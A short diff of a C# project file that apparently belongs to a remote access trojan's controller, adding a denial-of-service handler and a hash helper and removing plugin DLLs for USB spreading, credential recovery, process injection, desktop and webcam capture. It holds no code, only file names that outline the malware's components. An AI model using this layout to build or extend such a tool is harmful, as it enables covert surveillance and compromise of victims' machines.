@@ -82,6 +82,7 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="Algorithm\Aes256.cs" />
+    <Compile Include="Algorithm\GetHash.cs" />
     <Compile Include="Algorithm\Sha256.cs" />
     <Compile Include="Forms\FormAbout.cs">
       <SubType>Form</SubType>
@@ -186,6 +187,7 @@
       <DependentUpon>FormWebcam.cs</DependentUpon>
     </Compile>
     <Compile Include="Handle Packet\HandleChat.cs" />
+    <Compile Include="Handle Packet\HandleDos.cs" />
     <Compile Include="Handle Packet\HandleKeylogger.cs" />
     <Compile Include="Handle Packet\HandleFileManager.cs" />
     <Compile Include="Handle Packet\HandleListView.cs" />
@@ -323,12 +325,7 @@
   </ItemGroup>
   <ItemGroup>
     <Content Include="async_icon.ico" />
-    <None Include="Resources\PluginUsbSpread.dll" />
-    <None Include="Resources\PluginRecovery.dll" />
-    <None Include="Resources\PluginRunPE.dll" />
-    <None Include="Resources\PluginDesktop.dll" />
     <None Include="Resources\webcam.png" />
-    <None Include="Resources\PluginCam.dll" />
     <None Include="Resources\netstat.png" />
     <None Include="Resources\blank-screen.png" />
     <None Include="Resources\save-image2.png" />
